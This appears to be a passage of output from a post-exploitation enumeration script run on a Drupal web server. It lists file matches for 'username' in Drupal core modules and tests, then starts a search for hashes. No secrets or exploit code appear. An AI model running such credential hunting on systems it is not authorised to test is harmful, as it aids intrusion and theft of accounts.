+/var/www/html/modules/locale/locale.test:    $username = $this->randomName(10);
+/var/www/html/modules/node/node.admin.inc:      'author' => theme('username', array('account' => $node)),
+/var/www/html/modules/node/node.module:    form_set_error('name', t('The username %name does not exist.', array('%name' => $node->name)));
+/var/www/html/modules/node/node.module:  $output .= theme('username', array('account' => user_load($node->uid)));
+/var/www/html/modules/node/node.module:      'user' => theme('username', array('account' => $node)),
+/var/www/html/modules/node/node.module:  $variables['name']      = theme('username', array('account' => $node));
+/var/www/html/modules/poll/poll.pages.inc:      $vote->name ? theme('username', array('account' => $vote)) : check_plain($vote->hostname),
+/var/www/html/modules/profile/profile.module:  $variables['name'] = theme('username', array('account' => $variables['account']));
+/var/www/html/modules/rdf/rdf.module:  $username_meta = array(
+/var/www/html/modules/rdf/rdf.test:    $this->assertTrue(!empty($user_username), 'foaf:name set on username.');
+/var/www/html/modules/rdf/rdf.test:    $username = $user2->name;
+/var/www/html/modules/rdf/rdf.test:      ':username' => $username,
+/var/www/html/modules/search/search.api.php:      'user' => theme('username', array('account' => $node)),
+/var/www/html/modules/simpletest/drupal_web_test_case.php:   * HTTP authentication credentials (<username>:<password>).
+/var/www/html/modules/simpletest/drupal_web_test_case.php:    // HTTP auth settings (<username>:<password>) for the simpletest browser
+/var/www/html/modules/simpletest/drupal_web_test_case.php:      $this->httpauth_credentials = $username . ':' . $password;
+/var/www/html/modules/simpletest/drupal_web_test_case.php:    $username = variable_get('simpletest_httpauth_username', NULL);
+/var/www/html/modules/simpletest/simpletest.pages.inc:  $form['httpauth']['simpletest_httpauth_username'] = array(
+/var/www/html/modules/simpletest/simpletest.pages.inc:  $username = variable_get('simpletest_httpauth_username');
+/var/www/html/modules/simpletest/tests/common.test:    $auth = str_replace('://', '://' . $username . ':' . $password . '@', $url);
+/var/www/html/modules/simpletest/tests/common.test:    $username = $this->randomName();
+/var/www/html/modules/simpletest/tests/database_test.module:    'username' => array('data' => t('Username'), 'field' => 'u.name'),
+/var/www/html/modules/simpletest/tests/database_test.module:      'username' => check_plain($account->name),
+/var/www/html/modules/simpletest/tests/filetransfer.test:  function __construct($jail, $username, $password, $hostname = 'localhost', $port = 9999) {
+/var/www/html/modules/simpletest/tests/filetransfer.test:  protected $username = 'drupal';
+/var/www/html/modules/simpletest/tests/filetransfer.test:  protected $username = NULL;
+/var/www/html/modules/simpletest/tests/system_test.module:    $form['system_test_username'] = array(
+/var/www/html/modules/simpletest/tests/system_test.module:  $output = t('Username is @username.', array('@username' => $user));
+/var/www/html/modules/statistics/statistics.admin.inc:      theme('username', array('account' => $access))
+/var/www/html/modules/statistics/statistics.admin.inc:      theme('username', array('account' => $log)),
+/var/www/html/modules/statistics/statistics.pages.inc:        theme('username', array('account' => $log)),
+/var/www/html/modules/system/system.api.php:    '%username' => format_username($account),
+/var/www/html/modules/toolbar/toolbar.module:        'title' => t('Hello <strong>@username</strong>', array('@username' => format_username($user))),                                                                                    
+/var/www/html/modules/tracker/tracker.pages.inc:        'author' => array('data' => theme('username', array('account' => $node))),
+/var/www/html/modules/trigger/trigger.test:        '@username' => $account->name,
+/var/www/html/modules/update/tests/update_test.module:    $form['udpate_test_username'] = array(
+/var/www/html/modules/user/user.admin.inc:    'username' => array('data' => t('Username'), 'field' => 'u.name'),
+/var/www/html/modules/user/user.admin.inc:      'username' => theme('username', array('account' => $account)),
+/var/www/html/modules/user/user.install:    '!username' => '[user:name]',
+/var/www/html/modules/user/user.js:  var usernameBox = $('input.username');
+/var/www/html/modules/user/user.js:  var username = (usernameBox.length > 0) ? usernameBox.val() : translate.username;                                                                                                                  
+/var/www/html/modules/user/user.module:    'change own username' => array(
+/var/www/html/modules/user/user.module:      $items[] = theme('username', array('account' => $user));
+/var/www/html/modules/user/user.module:  return is_object($account) ? format_username($account) : '';
+/var/www/html/modules/user/user.module:      'sameAsUsername' => t('Make it different from your username'),
+/var/www/html/modules/user/user.module:      'username' => (isset($user->name) ? $user->name : ''),
+/var/www/html/modules/user/user.module:username: [user:name]
+/var/www/html/modules/user/user.test:    $expected_authmaps['external username three'] = array('blog' => 'external username three');                                                                                                    
+/var/www/html/modules/user/user.test:      'external username one' => array(
+/var/www/html/modules/user/user.test:      'external username two' => array(
+/var/www/html/modules/user/user.test:    $remove_username = 'external username one';
+/var/www/html/modules/user/user.test:      str_repeat('x', USERNAME_MAX_LENGTH + 1) => array('Invalid excessively long username', 'assertNotNull'),
+/var/www/html/modules/user/user.test:    $test_cases = array( // '<username>' => array('<description>', 'assert<testName>'),
+
+[+] Searching specific hashes inside files - less false positives (limit 70)
